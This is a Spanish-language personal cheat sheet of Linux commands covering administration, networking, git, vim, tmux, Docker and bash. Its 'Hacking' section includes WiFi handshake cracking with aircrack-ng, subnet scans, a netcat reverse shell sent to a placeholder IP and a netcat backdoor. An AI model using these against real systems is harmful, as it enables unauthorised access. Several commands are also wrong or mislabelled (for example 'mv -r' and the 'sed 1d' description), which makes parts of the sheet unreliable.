# Una lista de mis comandos favoritos en Linux, por Ro

Privilegios absolutos (root)

```
su
```

Si el usuario pertenece al grupo de administradores

```
sudo -i
``` 

Para saber que distro de linux tienes

```
uname -a
```

Actualizar Debian/Ubuntu

 ```
 apt update -y
 apt upgrade -y
 ```
En Fedora/Centos se utiliza yum para gestionar los paquetes

```
yum update -y
```

Arch/Manjaro

```
pacman -Syy
pacman -Su
```

Puedes usar '&&' para varios comandos seguidos 
```
 apt update -y && apt upgrade -y && apt autoremove -y
 ```

Crear usuario

```
sudo useradd nombreusuario
```

Para agregar usuarios a grupos, por ejemplo, grupo sudo

```
sudo usermod -aG sudo nombreusuario
```

Eliminar usuario

```
sudo userdel nombreusuario
```

Ver usuarios y detalles del host

```
users
hostnamectl
```

Para cambiar la contraseña utilizamos:

```
passwd
```

Para el root, utilizamos:

```
sudo passwd root
```

Para ver los grupos a los que pertenece el usuario

```
group nombreusuario
``` 

Para saber el nombre del host

```
hostname
```
 
Para cambiar el nombre

```
hostnamectl set-hostname nuevonombre
```

Instalar todo tipo de programas en Linux, por ejemplo, htop: 

```
sudo apt install htop -y
```

Instala programas con snap (``apt install snapd`` o ``yum install snapd``), por ejemplo, VScode, Android Studio y VLC:

```
snap install code --classic
snap install android-studio --classic
snap install vlc --classic
```
En Arch/Manjaro no necesitamos snap, ya en con ``yay`` encontramos todo lo que necesitamos

```
yay -S vim code android-studio vlc
```

Crear y navegar a las carpetas
```
mkdir carpeta
cd /carpeta 
```
Regresar al directorio anterior
```
cd ..
```
Saber el directorio en el que estamos
```
pwd
```
Crear un archivo vacio:

```
 touch nombrearchivo
```
 
Crear un archivo con un texto corto:

```
 echo "Texto corto" > nombrearchivo
```

Si utilizamos >> agregamos el texto sin reemplazar el archivo. 

```
 echo "Agregamos texto nuevo" >> nombrearchivo
 ```

Si queremos aplicar un comando a un archivo, por ejemplo, un sript mysql, usamos "<" 

```
mariadb --user=root --password -s < mariadb.sql
```

Para echar un ojo a un archivo corto:

 ```
 cat archivo
 more archivo
 less archivo
 ```
 
Con el editor nano podemos ver y editar archivos más grandes:

 ```
 nano nombrearchivo
 ```
 
Utilizando Crlt-x guardamos los cambios. 
Limpiar la pantalla en la terminal
```
 clear # o Crtl-L
```

Ver la historia del terminal

```
history
```
* Para limpiar el historial ``history -c`` (bash)

Mostrar toda la estructura de los ficheros:

```
tree
```
Copiar archivos de un sitio a otro:

 ```
 cp carpeta/archivo carpeta/
 ```
 
Crear copia con nuevo nombre

```
 cp archivo nuevoarchivo
```

Renombrar archivos (no guarda la copia anterior)

```
 mv archivo nuevoarchivo
 ```

Listar archivos 

```
ls
ls -l 
```
Para mover archivos seguimos el mismo razonamiento que al copiar. Mientras que si es una carpeta debemos agregar -r.

``` 
mv -r carpeta/ /carpeta/destino
 ```

Mover todos los archivos de una carpeta a otra

```
mv -r carpeta/ * /destino/
```

Para eliminar archivos y carpetas:
 ```
 rm nombrearchivo
 rm -r /carpeta
 
```
Cuidado, ``#sudo rm -r /*``  destroza nuestro sistema, elimina todo

Crear links a archivos es sencillo, por ejemplo, al "``archivo1``":

```
link archivo1 archivo2
```

Opcionalemente podemos utilizar:

```
ln archivo1 archivo2
```

Para crear links a directorios o entre particiones

```
ln -s /dir1 archivos
```

Este comando es un combo, ya que permite saber que binarios tenemos instalados:

```
ls /bin/ && ls /usr/bin
```

Para saber dispositivos conectados a los puertos USB:

```
lsusb
```
Para montar un disco, lo ubicamos con ``fdisk -l`` y luego ``sudo mount -rw /nombre/disco /mnt``.

Para saber el porcentaje de uso de los discos disponibles:

```
df --total -hl
```

Crear un USB bootable con cualquier imagen de Linux.  

```
 sudo dd bs=4M if=arch.iso of=/dev/sdb status=progress
```
 
Ver las conexiones en los sockets de nuestro equipo

```
ss
ss -l
ss | grep tcp
ss -t -a 
```
Para conocer los usuarios logueados en el sistema:

```
who
```

IP local y Wifi.

```
 ifconfig
 ip address
 iwconfig
```

IP pública

```
curl ifconfig.me
curl https://ipinfo.io/ip
```

Ruta

```
ip route
route -n
```

Enviar peticiones a servidores online o en red local

```
ping google.com
ping 192.168.1.1
```
 
Usuario y tiempo conectado
```
uname -r
uptime -p
```

Almacenamiento de los discos ``df``
 
Si queremos saber donde está un dispositivo USB, disco duro y sus particiones:

 ```
 sudo fdisk -l
 ```
Los procesos del sistema pueden mostrarse con:

```
 top
 htop
 ps -ef | less
 ```
El signo | nos permite concatenar comandos (pipes).

Imprimir todos los procesos en un momento determinado

```
ps -ef
```

Detalles del Hardware y bios del sistema

```
dmidecode
```

Con neofetch podemos ver detalles de nuestro sistema de manera divertida (``apt install neofetch``)

 ```
 neofetch
 ```
 
Descomprimir archivos
 
 ```
 unzip * .zip
 gunzip example.txt.gz
 ```

Instalación de aplicaciones .deb. Tambien es posible usar ``gdebi``. 

```
 dpkg -i archivo.deb && apt install -f
```

Los siguientes comandos utilizan systemctl para controlar servicios del sistema.
```
 systemctl enable nombreservicio
 systemctl start nombreservicio
 systemctl stop nombreservicio
 systemctl disable nombreservicio
```
Reiniciar Wifi 

```
service network-manager restart
```

``nohup`` para jecutar un comando o script en background, por ejemplo, un scrip de Python.

```
nohub python3 main.py > flask.log 2>&1 &
```

Detener proceso 

 ```
 top
 kill idproceso
 ```

Características del sistema

```
 lshw
 lscpu
```
 
Browser en terminal

```
elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4
```

## Comandos comunes que siempre olvido.

Ver lista de fuentes 

```
nano /etc/apt/sources.list
```

Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, 
```
# por ejemplo, dar todo tipo de acceso a un archivo:
 sudo chmod 777 nombrearchivo
 sudo chmod a+rwx nombrearchivo
 #O para que solamente root pueda acceder a ellos:
 sudo chmod 700 nombrearchivo
```
Acceso a carpeta para todos los usuarios:
```
chmod ugo+rwx nombrecarpeta
```

Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY"

```
sudo chown -hR root /u
```    

## Encontrar palabras con ``grep`` o ``egrep``
```
touch example
ls | egrep example

```
Buscar palabra en archivo

``look texto archivo`` o ``grep texto archivo``

 Encontrar después de patrón:
```
 echo "field1 field2 field3 field4" | grep -oP '(?<=field3 )[^ ]*'
```
Antes del patrón:
```
echo "field1 field2 field3 field4" | grep -oP '(?<=field2 )\w+'
```

## Información de la red 
 
 IP del proveedor de Internet
 
 ``` 
 grep nameserver  /etc/resolv.conf | awk '{print $2}'
 ```
 
 IP del servidor local
 
 ```
 ip route show |grep default | awk '{print $3}' | cut -d$'\n' -f1
 ```
 
 IP local del dispositivo
 
 ```
 ip address show $interface | grep "inet " | awk '{print $2}'
 ```

## Manejo de archivos y Data Mining

Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso. 

 ```
 ls | grep * .iso
 ```
 
Para saber el número de archivos en una carpeta:

``` 
ls | wc -l
```

Conocer la cantidad de filas en un archivo

```
wc -l archivo
```


Para acceder a las 10 primeras y últimas filas:

 ```
 head -10 archivo
 tail -10 archivo
 ```

Si el archivo es demasiado grande, podemos separarlo en varias partes, por ejemplo, cinco:

```
split -n l/5 archivo x
```

Para seleccionar la quinta columna, utilizamos:

```
awk '{print $5}' archivo
```

Separar columnas en función de un caracter, por ejemplo, dos puntos (:)

 ```
 cut -d ':' -f1 archivo
 ```

Obtener la primera fila de datos

```
sed 1d archivo
```

Eliminar la última línea o fila de datos

```
sed -i '$ d' archivo
```


Cambiar el orden de columnas

```
awk '{ print $3, $1 }' archivo.txt

ps -ef | awk -F " " '{print $2}' 
```

Cortar una sección intermedia de filas
```
sed -n '250, 260p' archivo1.txt > archivo2.txt
```

Crear un secuencia ``seq 1 10``

Para buscar archivos

```
sudo apt-get install mlocate
locate -i archivo
```

Localizar un comando:

```
which python
```

## Programas importantes

### SSH
Instalar
```
sudo apt-get install openssh-server -y
sudo systemctl enable ssh 
sudo systemctl start ssh
sudo systemclt status ssh
```

Agregar llaves para no usar contraseñas.
```
ssh-keygen
ssh-copy-id -i ~/.ssh/id_rsa.pub UserName@RemoteServer
ssh-add
```
Copiar archivos local --> remoto

```
scp /dir/al/archivo user@remote.local:~/Destino/
scp -P 22 -r /dir/ user@remote:~/Destino/
```
Copiar archivos remoto --> local
```
scp user@ip:file.txt /path/to/dest 
```
Comandos a distancia

``ssh user@remote.local ls``

Para conectar fuera de la red local necesitamos la IP pública del router y haber abierto un túnel para un servidor local

``ssh user@IP`` 


Firewall
```
ufw allow 22/tcp # o ufw allow 2222/tcp
ufw allow from 202.54.1.1 to any port 22
ufw limit ssh
ufw status
```
Detener y deshabilitar:
```
systemctl stop ssh
systemclt disable ssh
```

### Wget 

Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19. 

```
wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb
```

Para descargar archivos de un servidor o website. 

```
wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com
```

Descargar el index.html y los links asociados al website.

```
wget -rpk www.programandoconro.wordpress.com
```

### Git

Para descargar un repositorios Git:

 ```
 git clone https://github.com/progamandoconro/My-Lynux-Locker
 ```
 
Para actualizar el repositorio local a partir de GitHub:

 ```
 git pull origin master
 ```
 
Los commits y los push también pueden realizarse de esta manera o directamente en GitHub. 

```
git add . # Agregar todos los archivos 
git add /path/to/file # Agregar un archivo concreto
git diff --cached 
git commit -m 'comment'
git push -u origin master
git checkout -b 'robranch' #o (git switch robranch) # Cambiar de branch
git push origin robranch
git branch -a # Ver las branchs
git fetch --all # Actualizar las branchs
git rm --cached myarchivo.txt # Elimina el archivo en todo el historial
git remote update origin --prune # Actualiza las branchs remotas localmente
```
Más opciones y comandos de git: 
```
git init
git config --global user.name "Your Name Comes Here"
git config --global user.email you@yourdomain.example.com
git status
git log
git log -p
git log --stat --summary
git help -a 
git help -g
```
Revertir commit:
```
git log --oneline # Para obtener la id del commit al que desear regresar.
git checkout <commit-id>
git add . && git commit "Go back" && git push origin <branch>
```
Tutorial de git
``git help tutorial``

Si creas un archivo ``.gitignore`` en el directorio, git ignora los archivos que determines.

### Tmux:

Install: ``apt install tmux``

Create a new session: ``tmux new -s mysession``

Split pane vertically: ``Ctrl b`` + ``%``

Split pane horizontally: ``Ctrl b`` + ``"``

Move between panes: ``Ctrl b`` + arrows

Create new window: ``Ctrl b`` + c

Move between windows: ``Ctrl b`` + n

Resize panes:

``Ctrl b`` + ``:`` + 

```
 resize-pane -D (Resizes the current pane down)
 resize-pane -U (Resizes the current pane upward)
 resize-pane -L (Resizes the current pane left)
 resize-pane -R (Resizes the current pane right)
 resize-pane -D 20 (Resizes the current pane down by 20 cells)
 resize-pane -U 20 (Resizes the current pane upward by 20 cells)
 resize-pane -L 20 (Resizes the current pane left by 20 cells)
 resize-pane -R 20 (Resizes the current pane right by 20 cells)
 resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells)
 resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)

```

Detach from session: ``Ctrl b`` + d

Switch sessions: ``Ctrl b`` + s

To check session: ``tmux ls``

To attach to a session: ``tmux attach -t mysession``

To kill a session, simply use: ``exit``

Extra ones:

Big clock: ``Ctrl b`` + ``t``

Shortcuts: ``Ctrl b`` + ``?``

### Vim:

Básicos:

``i`` -> Modo insertar (insertar texto).

``ESC`` -> Modo Normal.

``v`` -> Modo visual.

``:w`` -> guardar.

``:wq`` -> guardar y salir.

``:qa!`` -> salir sin guardar.

``k`` -> subir.

``j`` -> bajar.

``h`` -> izquierda.

``l`` -> derecha.

``o`` -> insertar + línea adicional.

``u`` -> undo, deshacer.

``Ctrl r`` -> rehacer.

``y`` -> copiar.

``d`` -> borrar (cortar).

``p`` -> pegar.

``a`` -> insertar a la derecha del cursor ``A`` -> inserta al final de la línea.

``I`` -> insertar al principio de la línea.

Desplazamiento:

``e`` -> final de palabra.

``w ``-> comienzo y final de cada palabra.

``0`` -> principio de línea.

``Shift arrows`` -> desplazar rapidamente por el documento.

``[[`` -> Ir al primer bloque.

``]]`` -> Ir al último bloque.

``}`` -> Bloque siguiente.

``{`` -> Bloque anterior.

``(`` -> Principio de línea.

``)`` -> Fin de línea.

``:55`` -> Ir a línea 55.

``Ctrl O`` -> Navegar entre posiciones.

`` '' `` -> Navegar a la posición previa. 

``f + {`` -> Va directamente al siguiente ``{``. Funciona para otros caracteres, por ejemplo: ``[ , ( , [a-z], [0-9] ,``, etc.

Selección:

``v`` -> seleccionar (usar cursor o letras para mover, sirve combiando con Shift).

``V`` -> seleccionar línea entera.

``:V G`` -> selecciona todo el texto abajo del cursor.

Seleccionar una función <- ``V }``.

Seleccionar bloques hacia abajo <- ``v }``.

Seleccionar bloques hacia arriba <- ``v {``.

Funcionalidades:

Mostrar archivos en path <- ``:!ls``.

Buscar y abrir archivos en path <- ``Ctrl p``.

Encontrar patrón en texto <- ``/patron``.

Borrar una función <-  ``V } d``.

Borrar todo dentro de comillas <- ``d i "``

Cambiar entre ventanas <- ``Ctrl + w + k`` o ``Ctrl + w + j``

Borrar 10 líneas abajos <- ``10  dd ``

Ir al inicio <- ``gg``. Ir al final ``G``. Mostrar status ``Ctrl + g``.

Ergonómicos:

Salir <- ``Z Q``

``Ctrl c``-> Modo Normal.

``:V G d`` -> borrar todo el documento

Borrar y editar directamente dentro de una función <- ``c i {`` 

``/`` -> buscar, ``n`` siguiente y ``N`` anterior

``Ctrl v`` -> Bloques visuales

``.`` -> Rehace el último comando en un sito nuevo.

Marcas:

Escribe ``:mark a`` en la línea que desea marcar, navega a ella con ``'a``. También puedes navegar entre marcas con ``['`` y ``]'``.

Editar múltiples líneas:

Seleccinamos con ``V`` y luego usamos ``Ctrl V`` seguido de las teclas de desplazamiento (j, k, l, h, etc...) y el texto a agregar.

Sustituir patrón de texto <- ``:%s 'texto a sustituir''nuevo texto'``.

Comentar múltiples líneas:

Comentar <- Seleccionar texto a comentar y luego ``:norm i// (o :norm i#)``. O, puedes utilizar ``:s/^/# /`` .

Autoindent múltiples líneas (Ideal para programar en Python):

Seleccionar líneas con ``V`` y luego ``>>``.

Autocompletar <- ``Ctrl x Ctrl o``, luego seleccionar con ``Ctrl n`` .

Prettier para js, html, css <- ``Ctrl l``. 

Editar varias líneas al mismo tiempo:

Encerrar texto seleccionado en un tab <- selecciona con v o V, luego ``S`` y finalmente el tag, por ejemplo, ```<div>```.
Para agregar espacios a multiples líneas seleccionamos con ``V`` y agregamos ``I``, luego con espacios movemos las líneas.  

Editar varios archivos en la misma pantalla

Editar un nuevo archivo: ``:e nombre_archivo``

Dividir la pantalla verticalmente y abrir un nuevo archivo para editar: ``:vsplit nombre_archivo`` 

Para dividir horizontalmente usamos ``:split``

Navegar entre pantallas: ``Ctrl w + jklh``

Con ``:hide`` podemos esconder la ventana, o simplemente ``:q``, ``:qa!`` o ``:wq`` para cerrarla.

Abrir la terminal sin salir de Vim:

Podemos usar ``:term`` o ``:vert term`` para que se divida la pantalla verticalmente. 

Adicionalmente, podemos usar ``Ctrl z`` para suspender Vim y luego ``fg`` en la terminal para regresar a vim. 

Encapsular un ``tag``  con otro ``tag`` facilmente. Útil para react, react-native, etc...
*Requiere el plugin ``surround``.

Selecciona el tag a encapsular con ``v``, luego utiliza ``S`` y escribe el tag que va a encapsular al anterior, por ejemplo ``View`` o ``div``.  

### Docker (o Podman)

``` 
docker run -it ubuntu 
docker images

```
Dockerfile:

```
FROM
MAINTAINER
LABEL
COPY
ADD
RUN
EXPOSE
CMD
ENTRYPOINT
```

```
docker build . -t example  
docker run example
docker ps
docker exec $ID bash
docker inspect $ID
docker network ls
docker image prune -a # borra las imagenes no utilizadas
docker system prune # elimina el cache, los containers e imagenes detenidas, etc.
```

Docker-compose
```
docker-compose build
docker-compose up
docker-compose start
docker-compose stop
```

docker run -it --network host example # para acceder a los puertos del localhost desde el contenedor. 

### Tor 

Para navegar de manera anónima.  Simplemente descárgalo de https://www.torproject.org y: 

```
 tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz 
 ./tor-browser_en-US/Browser/start-tor-browser &
```

 ### Anaconda
 ```
 conda create -n my_env python=3.7 anaconda
 conda create -n r_env r-essentials r-base
#Creados estos tres ambientes, podemos activar alguno con:

conda activate r_env
#Y ver las sesiones creadas con:

 conda info --envs
#Para instalar modulos de Python, por ejemplo, face_recognition, utilizamos conda o pip:

 conda install face_recognition # (o pip install face_recognition)
 
 ```
 
### Descargar videos
 
```
youtube-dl $url
# solamente audio
youtube-dl --extract-audio --format mp3 
# Ver los formatos disponibles 
youtube-dl -F $url
```
### Cambiar formato .avi a .mp4

```
ffmpeg -i input.avi -strict -2 output.mp4
```

### Crear gifs animados (``ImageMagick``):

```
convert -delay 10 -loop 0 * .png mygif.gif
```

### Ver fotos en la terminal(``apt install fbi``:

```fbi foto.png ```

### VLC para controlar la música desde la línea de comandos. 

 ```
 cvlc /music
 # para ver opciones de control:
 vlc --help
 ```
 
### Juegos en Terminal
 
 ```
 apt-get install bastet moon-buggy ninvaders nsnake pacman4console neofetch figlet -y
 bastet
 moon-buggy
 figlet HOLA AMIGO 
 
 ``` 
 El próximo comando te hará sentir en la matrix. (apt install cmatrix)
 
 ```
 cmatrix 
 telnet towel.blinkenlights.nl
 ``` 
 
Factores en la terminal ``factor 12``
 
Voltea la palabra que introduzcas ``rev`` agrega 123, por ejemplo. 

Repite un mensaje ``yes Viva Linux!!``
 
Provocar sonidos en el computador (apt install beep / yum install beep) ``beep -f 4000 -D 500 -l 100 -r 100``

También se puede hacer un banner, sencillamente: ``banner hola``

Instalar nuevos themes e íconos

```
apt search shell-theme # o dnf en Fedora
apt search icon-theme

apt install ... # dnf install ... 
```
## COMANDOS NIVEL INTERMEDIO 

Buscar paquetes que contienen algun comando que requerimos

```
# Debian / Ubuntu
apt search paquete

# Fedora / Centos
yum search paquete

# Manjaro / Arch
pacman -Ss paquete
```
Para ejecutar scripts al iniciar el sistema
```
cd ~
sudo nano .bashrc
# Escribe el script
./script
```
Para seguir ejecutando un comando incluso despues de cerrar la sesión en tu servidor. Usa ``ssh``para entrar en tu servidor. Luego ejecuta ``screen``, esto creará una nueva pantalla, ejecuta el comando que deseas que siga corriendo después de desloguearte y finalmente ``Ctrl`` + ad. El comando seguirá corriendo.

Listar las aplicaciones desktop

```
ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
```

Tiempo de procesos

```
echo "sudo apt update -y" > myUpdate.sh 
time bash myUpdate.sh
```
 Esperar 10 segundos. 

```
sleep 10
```

Asignar nombre a variable introducida por el usuario:

```
read -p "Enter a word: " word
echo "You entered $word"
```

Programar tareas

```
rm -f /var/run/crond.pid #delete pid
cron 00 00 * * * myUpdate.sh #todos los dias a las 12
```
Cambiar el tamaño de las fuente en terminal. 
```
dpkg-reconfigure console-setup
```

Kill procesos en un socket determinado

```
sudo lsof -t -i tcp:8000 | xargs kill -9
```

Asignar "alias" a comandos, por ejemplo:

```
alias python=python3
```
Para que estos cambios sean permanentes, puedes agreagar un ``alias`` en el archivo ``bashrc``:

```
echo "alias python='python3.9'" >> ~/.bashrc
source ~/.bashrc
```

Crear tu propio comando:

```
echo "echo MI PROPIO COMANDO" > micomando
chmod +x micomando
sudo mv micomando /usr/bin/

micomando

```
Formatear USB:
``` 
fdisk -l # encontramos el dispositivo, por ejemplo sdc1.
umount /dev/sdc1
sudo mkfs -t vfat /dev/sdc1
``` 

Controlar luz de la pantalla (Debes encontrar el archivo ``brightness``):

```
echo 8 > /sys/class/backlight/intel_backlight/brightness 
```

Escribir un script de varias líneas en la terminal sin usar un editor.

```
cat <<EOF > print.sh
#!/bin/bash
echo esta es una línea
echo esta es otra línea
EOF
```
``sh print.sh``

Ejecutar un script cada vez que iniciemos una sesión, por ejemplo, un programa ``python``:

``sudo vim /etc/profile`` y agregamos al final ``sudo python /carpeta/con/el/programa/nombreprograma.py &``

## Hacking:

### Nmap 

(``apt install nmap``)

```
nmap localhost

# Para evaluar la red local entera:
nmap 192.168.1.1/24 #(o 192.168.0.1/24)

#filtrar por puerto y estado 
nmap -Pn 192.168.1.1/24 -p22 -open  

# Auditar 
nmap -Pn **PublicIP**/24 
```

### SSH

Conectar

 ```
ssh usuario@servidor.local
```
 
 o 
 
 ```
 ssh usuario@IP
 ```
 
 Conectar SSH sin password
 
 ```
 ssh-keygen
 ssh-copy-id -i ~/.ssh/id_rsa.pub usuario@servidor.local
 ```

Compartir archivos

```
scp nombrearchivo mi@servidor.local:~
```

Bloquear IPs que intenten conectar sin permiso

```
iptables -A INPUT -s $IP -j DROP
 ```

 Elegir en cual servidor mostrar el display. 

```
export DISPLAY=:0 # en el servidor local
export DISPLAY=:1 # en el servidor remoto
 ```
 Reverse shell tunneling:
 
 El cliente con Firewall se conecta a la computadora del desarrollador (dev), y envía su shell de manera reversa (``-R--``), creando un túnel.
 
 ```
ssh -R 19999:localhost:22 dev@publicIP
```
 
 El desarrollador escucha en el puerto 19999 y accede a la computadora del cliente (cli), gracias al túnel abierto.
 
 ``ssh cli@localhost -p 19999``
 
 Redirigir un puerto (ej. 80) de una computadora remota al localhost (ej. 2002):
 
 ``ssh -N -L2002:localhost:80 user@ip_machine``

### Compartir la terminal en el browser

(``apt install tmate`` / ``yum install tmate``)

```
tmate
```
 
### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (``apt install aircrack-ng``)
 
```
ifconfig wlan1 down
iwconfig wlan1 mode monitor
iwconfig
airdump-ng
airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX:XX -w output wlan1
aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt 
```
Escaneo de Redes Wifi Disponibles 
```
sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"
```
### Ncat:

Reverse Shell:

Desarrollador escucha en puerto 4444

```
 nc -lvp 4444 
```

Cliente envía su Shell a la IP del desarrollador

```
nc **IP** 4444 -e /bin/sh
```

Backdoor

Ejecutar en el servidor remoto

```
nc -L -p 3001 -d -e cmd.exe
```

Servidor web inseguro

```
while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done
```

Chat
```
nc -l -vv -p 5000
nc 192.168.56.1 5000
```
Enviar archivo (inseguro)

```
Receptor escucha:
nc -l -p 9999 > test.txt

El otro lado envía:
nc 192.168.0.1 9999 < test.txt
```

Enviar archivo via ncat por tunel ssh (Seguro)

```
nc myDocument.pdf | ssh me.myserver.com nc -l -p 20000
# cliente
nc me.myserver.com 20000 > myDocument.pdf

 ```
### Script al iniciar el sistema (boot).

```
sudo crontab -e
# Add line to file (here a python script):
@reboot python3 /home/pi/Desktop/exemple.py &
```
### Ejecutar un comando cada 2 segundos.

```
watch ls
```
Si desde otras ventana agregas unos archivos, podrás ver los cambios en ventana que ejecuta watch. 

### Crear tu propio comando.

```
sudo -i
echo echo 'Hello World Linux' > mi-super-comando
chmod +x mi-super-comando && cp mi-super-comando /usr/bin/
mi-super-comando
```

## IOT

Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:

 ```
 dmesg | grep ttyUSB
 ```
 
Podemos usar rshell y repl para acceder al dispositivo

 ```
 rshell -p /dev/ttyUSB && repl
 ```
 
Para interactuar con el dispositivo, podemos usar:

```
 ampy --port /dev/ttyUSB** ls
 ampy --port /dev/ttyUSB** put archivo
 ampy --port /dev/ttyUSB** run archivo
 ampy --port /dev/ttyUSB** rm archivo
```
Temperatura CPU Raspberry Pi

```
/opt/vc/bin/vcgencmd measure_temp
```
 
Controla el audio:

```
amixer scontrols
```

Busca el dispositivo y ajustar el volumen 

```
amixer sset 'PCM' 100%
```

Cambiar el banner cuando accedemos al shell del servidor.

```
vim /etc/motd
```
## Programación (Bash Script)

### Declarar variables:

          mivar="HOLA-MUNDO!!"
          echo $mivar
          yes $mivar

### Leer input del usuario:

          read -p "Escríbeme un saludo: " -r saludos
          echo "$saludos para ti también"

### For 

          for i in {1..10} ; do 
              echo "hola $i"; 
          done

           
            for i in $( ls ); do
                echo item: $i;
                sleep 1;
            done 

            
            for i in `seq 1 10`;
            do
                    echo $i
            done    
            
            for e in {0..9};do echo $e🍀; done;
            
### While
              
             COUNTER=0
             while [  $COUNTER -lt 10 ]; do
                 echo The counter is $COUNTER
                 let COUNTER=COUNTER+1 
             done
    
### Until
              
             COUNTER=20
             until [  $COUNTER -lt 10 ]; do
                 echo COUNTER $COUNTER
                 let COUNTER-=1
             done
             
### If
             
             if [ hola == hola ]; then
                 echo TRUE;
                 else 
                     echo FALSE;
             fi
             
             VAR="Hello Amit";
             if [[ $VAR == *Amit* ]];
                 then echo "its Amit";
                 else
                     echo "Its not Amit";
             fi
             
### Aritmética   

             echo $((((2+2-3)*3)/3))
             
### Funciones

             function chao {
               echo 'Chao amigo!';
               exit;
             }
 
             
###########################################################################

Como despedida ... salir, reiniciar, apagar en 30 min, apagar ahora, respectivamente.

```
 exit
 reboot
 shutdown -h +30
 poweroff -f
 
 ```
 
# Links a Posts Relacionados:

https://programandoconro.wordpress.com/2019/10/02/mis-99-comandos-favoritos-en-gnu-linux/
https://programandoconro.wordpress.com/2020/01/02/10-trucos-en-linux-para-programadores-principiantes/
https://programandoconro.wordpress.com/ssh-accede-a-tu-red-local-y-programa-remotamente/
